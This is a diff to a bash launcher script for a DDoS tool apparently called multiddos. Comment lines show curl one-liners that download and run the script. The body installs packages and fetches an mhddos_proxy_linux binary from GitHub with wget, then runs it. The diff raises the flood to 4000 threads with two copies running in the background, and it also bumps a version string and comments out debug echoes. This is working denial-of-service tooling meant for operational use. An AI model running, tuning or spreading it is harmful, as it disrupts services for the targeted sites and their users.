@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.2m\n"
+clear && echo -e "Loading... v1.2n\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -132,14 +132,14 @@ pkill -f mhddos_proxy_linux
 if [[ $mhddos_mode == "new" ]]; then
     cd ~/multidd/
     wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
-    echo "here0"
-    sleep 1
+    # echo "here0"
+    # sleep 1
     chmod +x mhddos_proxy_linux
 
-    echo "here1"
-    sleep 1
+    # echo "here1"
+    # sleep 1
 
-    ./mhddos_proxy_linux -t 1000 $args_to_pass
+    ./mhddos_proxy_linux --copies 2 -t 4000 $args_to_pass &
 
     # if [[ $ddos_size == "XS" ]]; then
     #     ./mhddos_proxy_linux -t 1000 $args_to_pass &
